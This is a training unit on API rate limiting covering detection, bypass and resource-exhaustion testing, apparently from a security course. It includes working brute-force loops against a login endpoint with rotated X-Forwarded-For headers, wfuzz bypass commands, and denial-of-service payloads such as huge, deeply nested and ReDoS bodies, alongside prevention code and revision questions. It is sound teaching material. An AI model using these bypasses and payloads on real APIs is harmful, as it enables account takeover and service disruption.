# Unit 11: API Security Testing - Topic 3: Rate Limiting and Resource Management

## Overview

Rate limiting is a critical API security control that restricts the number of requests a client can make within a specified time window. Without proper rate limiting, APIs are vulnerable to **brute force attacks**, **denial of service (DoS)**, **credential stuffing**, **data scraping**, and **resource exhaustion**. Testing rate limiting involves identifying its presence, understanding its implementation, and finding ways to bypass or circumvent it. OWASP API Security Top 10 lists "Unrestricted Resource Consumption" (API4:2023) as a major risk.

---

## 1. Rate Limiting Fundamentals

### Why Rate Limiting Matters

```
Without Rate Limiting:
┌──────────┐   1000 req/sec    ┌──────────┐
│ Attacker │ ─────────────────►│  API     │ → Server overload
│          │   (brute force)   │  Server  │ → Data scraping
│          │                   │          │ → Account lockout bypass
└──────────┘                   └──────────┘ → Resource exhaustion

With Rate Limiting:
┌──────────┐   1000 req/sec    ┌──────────┐   ┌──────────┐
│ Attacker │ ─────────────────►│  Rate    │──►│  API     │
│          │                   │  Limiter │   │  Server  │
│          │ ◄── 429 Too Many  │          │   │          │
└──────────┘     Requests      └──────────┘   └──────────┘
                                  │ Only 10
                                  │ req/min
                                  │ pass through
```

### Rate Limiting Algorithms

| Algorithm | How It Works | Pros | Cons |
|-----------|-------------|------|------|
| **Fixed Window** | Count requests in fixed time intervals | Simple to implement | Burst at window edges |
| **Sliding Window** | Rolling time window for counting | Smoother limiting | More complex |
| **Token Bucket** | Tokens replenish at fixed rate | Allows bursts | Token tracking overhead |
| **Leaky Bucket** | Requests queue and process at fixed rate | Smooth output | Drops excess requests |
| **Sliding Log** | Log each request timestamp | Most accurate | Memory intensive |

### Common Rate Limit Implementations

```
Rate Limit Headers (Standard):
HTTP/1.1 200 OK
X-RateLimit-Limit: 100        ← Max requests per window
X-RateLimit-Remaining: 95     ← Requests remaining
X-RateLimit-Reset: 1623456789 ← When limit resets (Unix timestamp)
Retry-After: 60               ← Seconds until retry (on 429)

HTTP/1.1 429 Too Many Requests
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1623456789
Retry-After: 60

{
  "error": "Rate limit exceeded",
  "message": "Too many requests. Please retry after 60 seconds."
}
```

---

## 2. Identifying Rate Limiting

### Detection Methodology

```bash
# Step 1: Send rapid requests and observe responses
for i in $(seq 1 200); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "Authorization: Bearer TOKEN" \
      http://target.com/api/data)
    echo "Request $i: $code"
done

# Step 2: Check for rate limit headers
curl -s -D - http://target.com/api/data | grep -i "rate\|limit\|retry\|throttl"

# Step 3: Monitor response time changes
for i in $(seq 1 50); do
    time=$(curl -s -o /dev/null -w "%{time_total}" http://target.com/api/data)
    echo "Request $i: ${time}s"
done

# Step 4: Test different endpoints
# Some endpoints may have different limits
# Login: 5 req/min (strict)
# Search: 30 req/min (moderate)
# Public API: 100 req/min (lenient)
```

### Rate Limiting Detection Indicators

| Indicator | Description |
|-----------|-------------|
| **429 Status Code** | Explicit rate limit response |
| **Rate limit headers** | X-RateLimit-*, Retry-After |
| **Increasing response time** | Server intentionally slowing down |
| **CAPTCHA challenge** | Triggered by too many requests |
| **IP block** | Connection refused after threshold |
| **Account lockout** | Account suspended after too many attempts |
| **Response content change** | Different error message after threshold |
| **Connection reset** | TCP connection dropped |

---

## 3. Rate Limit Bypass Techniques

### 3.1 IP-Based Bypass

```bash
# Bypass: Rotate source IP headers
# Many applications trust proxy headers for client IP

# X-Forwarded-For rotation
for i in $(seq 1 100); do
    curl -H "X-Forwarded-For: 10.0.0.$i" \
      -d '{"user":"admin","pass":"guess'$i'"}' \
      http://target.com/api/login
done

# Other IP headers to try
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-Client-IP: 1.2.3.4
X-Host: 1.2.3.4
True-Client-IP: 1.2.3.4
Forwarded: for=1.2.3.4
CF-Connecting-IP: 1.2.3.4
Fastly-Client-IP: 1.2.3.4
X-Cluster-Client-IP: 1.2.3.4

# Test all headers simultaneously
curl -H "X-Forwarded-For: 10.0.0.1" \
     -H "X-Real-IP: 10.0.0.2" \
     -H "X-Originating-IP: 10.0.0.3" \
     -H "X-Client-IP: 10.0.0.4" \
     -H "True-Client-IP: 10.0.0.5" \
     http://target.com/api/login
```

### 3.2 Endpoint Variation

```bash
# Same endpoint, different paths
POST /api/login
POST /api/Login
POST /api/LOGIN
POST /api/login/
POST /api/./login
POST /api/login?dummy=1
POST /api/login?dummy=2
POST /api/login#fragment
POST /API/login

# URL encoding
POST /api/%6cogin       # 'l' encoded
POST /api/lo%67in       # 'g' encoded
POST /api/logi%6e       # 'n' encoded

# Double encoding
POST /api/%256cogin

# Different API versions
POST /api/v1/login
POST /api/v2/login
POST /api/v3/login

# Path parameter variation
POST /api/auth/login
POST /api/authentication/login
POST /api/signin
POST /api/authenticate
```

### 3.3 Header and Body Manipulation

```bash
# Change User-Agent
curl -A "Mozilla/5.0 (Windows)" http://target.com/api/login
curl -A "Mozilla/5.0 (Mac)" http://target.com/api/login
curl -A "Mozilla/5.0 (Linux)" http://target.com/api/login

# Change Content-Type
# JSON
curl -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test"}' http://target.com/api/login

# Form data
curl -d "user=admin&pass=test" http://target.com/api/login

# XML
curl -H "Content-Type: application/xml" \
  -d '<auth><user>admin</user><pass>test</pass></auth>' http://target.com/api/login

# HTTP method change
POST /api/login  →  PUT /api/login
                 →  PATCH /api/login

# Add insignificant parameters
POST /api/login
{"user":"admin","pass":"test","_":"1234"}
{"user":"admin","pass":"test","_":"5678"}

# Unicode/whitespace in parameters
{"user":"admin","pass ":"test"}
{"user":"admin","pass":"test\u0000"}
{"user ":"admin","pass":"test"}
```

### 3.4 Distributed and Timing Bypass

```bash
# Slow down requests to stay under threshold
# If limit is 10 req/min, send 9 req/min
import time, requests

for password in passwords:
    requests.post(url, json={"user":"admin","pass":password})
    time.sleep(7)  # 8.5 req/min (under 10 limit)

# Distribute across time windows
# If fixed window resets every minute:
# Send 10 requests at 00:59
# Send 10 requests at 01:00  
# = 20 requests in 2 seconds, both within their windows

# Use multiple accounts
# If rate limit is per-user, create multiple accounts
# Distribute brute force across accounts
```

### Bypass Techniques Summary

| Technique | What It Bypasses | Success Rate |
|-----------|-----------------|--------------|
| IP header rotation | IP-based rate limiting | High |
| URL variation | Path-based rate limiting | Medium |
| Case variation | Case-sensitive matching | Medium |
| Method change | Method-specific limits | Low-Medium |
| Content-Type change | Parser-specific limits | Low |
| User-Agent rotation | UA-based fingerprinting | Medium |
| Timing manipulation | Fixed window limits | High |
| Distributed attack | Per-source limits | High |
| API version switching | Version-specific limits | Medium |
| Parameter pollution | Request deduplication | Low |

---

## 4. Resource Exhaustion Testing

### API4:2023 - Unrestricted Resource Consumption

```bash
# Test 1: Large payload size
# Send extremely large JSON body
python3 -c "print('{\"data\":\"' + 'A'*10000000 + '\"}')" | \
  curl -X POST -d @- -H "Content-Type: application/json" \
  http://target.com/api/data

# Test 2: Deep nesting
python3 -c "print('{' * 10000 + '\"a\":1' + '}' * 10000)" | \
  curl -X POST -d @- http://target.com/api/data

# Test 3: Large array
python3 -c "import json; print(json.dumps({'items': list(range(1000000))}))" | \
  curl -X POST -d @- http://target.com/api/data

# Test 4: Pagination abuse
# Request extremely large page sizes
GET /api/users?page=1&per_page=999999999

# Test 5: GraphQL complexity
# Deeply nested query
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author { name }
            }
          }
        }
      }
    }
  }
}

# Test 6: Regex DoS (ReDoS)
# If API uses regex on input
POST /api/search
{"pattern": "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}
# If server uses vulnerable regex like: ^(a+)+$

# Test 7: File upload size
# Upload extremely large files
dd if=/dev/zero bs=1M count=1000 | \
  curl -F "file=@-;filename=large.bin" http://target.com/api/upload

# Test 8: Expensive operations
# Trigger computationally expensive operations
GET /api/report?start=2000-01-01&end=2024-12-31&format=pdf&include_all=true
```

### Database Resource Exhaustion

```bash
# Wildcard/regex search abuse
GET /api/search?q=.*          # Match everything
GET /api/search?q=a%25        # SQL LIKE with wildcard

# Sort by computed column
GET /api/users?sort=EXPENSIVE_FUNCTION(column)

# Request all fields
GET /api/users?fields=*

# Deep populate/expand
GET /api/users?expand=posts.comments.author.posts.comments

# Batch operations
POST /api/batch
{
  "operations": [
    {"method": "GET", "path": "/users/1"},
    {"method": "GET", "path": "/users/2"},
    // ... 10,000 operations
  ]
}
```

---

## 5. Testing Tools

### Turbo Intruder for Rate Limit Testing

```python
# Turbo Intruder script for rate limit testing
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=True
    )
    
    # Test increasing request rates
    for i in range(1000):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if req.status == 429:
        table.add(req)  # Rate limited
    elif req.status == 200:
        table.add(req)  # Successful
```

### Python Rate Limit Tester

```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def test_rate_limit(url, headers, num_requests=200):
    """Test rate limiting on an endpoint"""
    results = {"success": 0, "limited": 0, "errors": 0}
    
    def send_request(i):
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 429:
                results["limited"] += 1
                return f"Request {i}: 429 RATE LIMITED"
            elif resp.status_code == 200:
                results["success"] += 1
                return f"Request {i}: 200 OK"
            else:
                results["errors"] += 1
                return f"Request {i}: {resp.status_code}"
        except Exception as e:
            results["errors"] += 1
            return f"Request {i}: ERROR - {e}"
    
    # Send requests concurrently
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(send_request, i) for i in range(num_requests)]
        for f in futures:
            print(f.result())
    
    print(f"\nResults: {results}")
    print(f"Rate limit threshold: ~{results['success']} requests")

# Test
test_rate_limit(
    "http://target.com/api/data",
    {"Authorization": "Bearer TOKEN"}
)
```

### Wfuzz for Rate Limit Discovery

```bash
# Wfuzz to find rate limit threshold
wfuzz -z range,1-500 -u "http://target.com/api/data" \
  --hc 429 -H "Authorization: Bearer TOKEN"

# Test IP header bypass
wfuzz -z range,1-255 -u "http://target.com/api/login" \
  -H "X-Forwarded-For: 10.0.0.FUZZ" \
  -d '{"user":"admin","pass":"password"}' \
  --hc 429
```

---

## 6. Prevention Techniques

### Implementing Effective Rate Limiting

```python
# Redis-based sliding window rate limiter
import redis
import time

r = redis.Redis()

def rate_limit(key, limit, window):
    """
    Sliding window rate limiter
    key: identifier (IP, API key, user ID)
    limit: max requests per window
    window: time window in seconds
    """
    now = time.time()
    pipe = r.pipeline()
    
    # Remove old entries
    pipe.zremrangebyscore(key, 0, now - window)
    # Count current entries
    pipe.zcard(key)
    # Add current request
    pipe.zadd(key, {str(now): now})
    # Set expiry
    pipe.expire(key, window)
    
    results = pipe.execute()
    current_count = results[1]
    
    if current_count >= limit:
        return False, {
            "X-RateLimit-Limit": str(limit),
            "X-RateLimit-Remaining": "0",
            "X-RateLimit-Reset": str(int(now + window)),
            "Retry-After": str(window)
        }
    
    return True, {
        "X-RateLimit-Limit": str(limit),
        "X-RateLimit-Remaining": str(limit - current_count - 1),
        "X-RateLimit-Reset": str(int(now + window))
    }
```

### Multi-Layer Rate Limiting

| Layer | Limit | Key | Purpose |
|-------|-------|-----|---------|
| **Global** | 10,000 req/min | None | DDoS protection |
| **Per IP** | 100 req/min | Client IP | Abuse prevention |
| **Per User** | 60 req/min | User ID | Fair usage |
| **Per Endpoint** | 10 req/min | User+Endpoint | Brute force prevention |
| **Per Action** | 3 req/hour | User+Action | Critical ops protection |

### Prevention Best Practices

| Practice | Implementation |
|----------|---------------|
| **Multi-key limiting** | Limit by IP AND user AND API key |
| **Endpoint-specific** | Stricter limits on auth/sensitive endpoints |
| **Response headers** | Always return rate limit headers |
| **Payload limits** | Max request body size, query complexity |
| **Pagination limits** | Cap per_page values, cursor-based pagination |
| **Cost-based limiting** | Weight expensive operations higher |
| **Circuit breaker** | Temporarily block after repeated violations |
| **WAF integration** | Layer rate limiting with WAF rules |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Rate Limiting** | Controls request frequency; prevents abuse |
| **Detection** | 429 status, rate limit headers, response time changes |
| **IP Bypass** | X-Forwarded-For, X-Real-IP header rotation |
| **URL Bypass** | Case variation, encoding, path manipulation |
| **Timing Bypass** | Window edge attacks, slow rate attacks |
| **Resource Exhaustion** | Large payloads, deep nesting, expensive queries |
| **Prevention** | Multi-layer limiting, per-endpoint rules, payload limits |

---

## Revision Questions

1. Explain the difference between fixed window and sliding window rate limiting algorithms. Why does the fixed window approach have a burst vulnerability?
2. Describe three techniques to bypass IP-based rate limiting and explain why each works.
3. What is OWASP API4:2023 (Unrestricted Resource Consumption)? Give three examples of resource exhaustion attacks.
4. How would you test whether an API has rate limiting on its authentication endpoint?
5. Why should rate limiting be implemented at multiple layers (global, per-IP, per-user, per-endpoint)?
6. Design a comprehensive rate limiting strategy for a public API that serves both free and paid users.

---

*Previous: [02-api-authentication-testing.md](02-api-authentication-testing.md) | Next: [04-api-specific-vulnerabilities.md](04-api-specific-vulnerabilities.md)*

---

*[Back to README](../README.md)*
